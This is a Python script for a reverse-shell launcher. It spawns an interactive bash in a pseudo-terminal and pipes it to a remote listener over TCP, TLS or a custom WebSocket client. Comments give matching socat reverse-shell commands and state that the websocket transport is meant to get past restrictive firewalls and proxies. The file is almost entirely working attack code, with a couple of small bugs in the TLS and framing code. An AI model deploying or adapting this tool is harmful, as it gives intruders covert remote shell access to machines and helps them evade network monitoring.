#!/usr/bin/env python3
# Target (reverse shell) launcher
#
# The idea is to provide something akin to the following:
# listener: socat file:$(tty),raw,echo=0 tcp-listen:4444
#   target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listener-addr>:4444
#
# But with different transports, specifically websocket and secure websockets to defeat restrictive firewalls/proxies

import argparse, base64, functools, hashlib, os, pty, select, ssl, socket, struct

class FileDesc:
    def __init__(self, fd):
        self.fd = fd

    def fileno(self):
        return self.fd

    def read(self, n=1024):
        rv = os.read(self.fd, n)
        assert len(rv) > 0
        return rv

    def write(self, data):
        os.write(self.fd, data)

class Socket:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def __enter__(self):
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip = socket.gethostbyname(self.host)
        self._socket.connect((ip, self.port))
        return self

    def __exit__(self, exctype, excval, traceback):
        self._socket.close()

    def fileno(self):
        return self._socket.fileno()

    def read(self, n=1024):
        rv = self._socket.recv(n)
        assert len(rv) > 0
        return rv

    def write(self, data):
        self._socket.sendall(data)

class TlsSocket(Socket):
    def __enter__(self):
        rv = super().__enter__()

        context = ssl.create_default_context()
        # This is necessary for (the likely used here) self-signed server certificates
        context.load_verify_locations('server.crt')

        rv._origsocket = rv._socket
        rv._socket = context.wrap_socket(rv._socket, server_hostname=rv.host)

        return rv

    def __exit__(self):
        self._socket.close()
        self._origsocket.close()

class WebSocket:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def __enter__(self):
        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip = socket.gethostbyname(self.host)
        self.__socket.connect((ip, self.port))

        key = base64.b64encode(os.urandom(16)).decode('utf-8')

        self.__socket.sendall(( 'GET / HTTP/1.1\r\n' +
                               f'Host: {self.host}\r\n' +
                                'Upgrade: websocket\r\n' +
                                'Connection: Upgrade\r\n' +
                               f'Sec-WebSocket-Key: {key}\r\n' +
                                'Sec-WebSocket-Protocol: chat\r\n' +
                                'Sec-WebSocket-Version: 13\r\n' +
                               f'Origin: https://{self.host}\r\n' +
                                '\r\n'
                              ).encode('utf-8'))

        headers = self.__socket.recv(4096).decode('utf-8').splitlines()

        assert headers[0] == 'HTTP/1.1 101 Web Socket Protocol Handshake'

        hs = [h for h in headers if h.startswith('Sec-WebSocket-Accept')]
        assert len(hs) == 1
        received = hs[0].split()[1]

        h = hashlib.sha1()
        h.update(key.encode('utf-8') + b'258EAFA5-E914-47DA-95CA-C5AB0DC85B11')
        expected = base64.b64encode(h.digest()).decode('utf-8')
        assert received == expected

        return self

    def __exit__(self, exctype, excval, traceback):
        self.__socket.close()

    def fileno(self):
        return self.__socket.fileno()

    def read(self):
        b1, b2 = struct.unpack('BB', self.__socket.recv(2))
        finbit = b1 & 0x80 == 0x80
        assert finbit
        opcode = b1 & 0x0f
        assert opcode == 2 # Binary frame
        maskbit = b2 & 0x80 == 0x80
        assert not maskbit
        payloadlen = b2 & 0x7f

        if payloadlen < 126:
            pass
        elif payloadlen == 126:
            payloadlen = struct.unpack('>H', self.__socket.recv(2))[0]
        else: # payloadlen == 127:
            payloadlen = struct.unpack('>Q', self.__socket.recv(2))[0]

        payload = self.__socket.recv(payloadlen, socket.MSG_WAITALL)
        assert len(payload) == payloadlen
        return payload

    def write(self, data):
        key = [ord(os.urandom(1)) for i in range(4)]
        frame = b'\x82'

        if len(data) < 126:
            frame += bytes([0x80 | len(data)]) + bytes(key)
        elif len(data) < 65536:
            frame += b'\xfe' + struct.pack('>H', len(data)) + bytes(key)
        else:
            assert len(data) < 2**63
            frame += b'\xff' + struct.pack('>Q', len(data)) + bytes(key)

        i = 0
        for b in data:
            frame += bytes([b ^ key[i]])
            i = (i + 1) % 4

        self.__socket.sendall(frame)

# FIXME Implement TlsWebSocket

# TODO Prototype novel transports, eg periodic http(s) requests for especially restrictive networks

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', '-o', default='127.0.0.1')
    parser.add_argument('--port', '-p', type=int, default=8000)

    transport_type = parser.add_mutually_exclusive_group()
    transport_type.add_argument('--socket', '-s', action='store_const', const='Socket')
    transport_type.add_argument('--tls-socket', '-t', action='store_const', const='TlsSocket')
    transport_type.add_argument('--websocket', '-w', action='store_const', const='WebSocket')

    args = parser.parse_args()

    transport = functools.reduce(lambda a,b: a or b,
                                 [v for k,v in args.__dict__.items() if 'socket' in k]) \
                    or 'Socket'

    childpid, childfd = pty.fork()
    if childpid == 0: # Child
        os.execl('/bin/bash', '-i')
    else: # Parent

        childobj = FileDesc(childfd)
        with locals()[transport](args.host, args.port) as server:

            while True:
                rlist, _, xlist = select.select([childobj, server], [], [childobj, server], 1.0)
                if xlist != []:
                    break

                for r in rlist:
                    w = server if r == childobj else childobj
                    w.write(r.read())
